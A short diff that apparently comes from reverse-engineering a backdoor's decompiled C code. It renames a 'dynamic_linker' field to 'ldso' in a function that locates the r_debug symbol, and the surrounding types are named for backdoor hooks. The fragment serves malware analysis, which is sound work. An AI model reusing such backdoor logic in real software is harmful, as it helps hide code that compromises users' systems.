@@ -27,11 +27,11 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
   backdoor_hooks_data_t **saved_hooks_data_addr;
   libc_imports_t *saved_libc_imports;
   
-  r_debug_symbol = elf_symbol_get(data->elf_handles->dynamic_linker,STR_r_debug,STR_GLIBC_2_2_5);
+  r_debug_symbol = elf_symbol_get(data->elf_handles->ldso,STR_r_debug,STR_GLIBC_2_2_5);
   success = FALSE;
   if (r_debug_symbol != (Elf64_Sym *)0x0) {
     debug_block = (uchar *)data->elf_handles;
-    r_debug_addr = ((elf_handles_t *)debug_block)->dynamic_linker->elfbase->e_ident + r_debug_symbol->st_value;
+    r_debug_addr = ((elf_handles_t *)debug_block)->ldso->elfbase->e_ident + r_debug_symbol->st_value;
     success = FALSE;
     if (0 < *(int *)r_debug_addr) {
       r_debug_sym = (Elf64_Sym *)data->shared_maps;
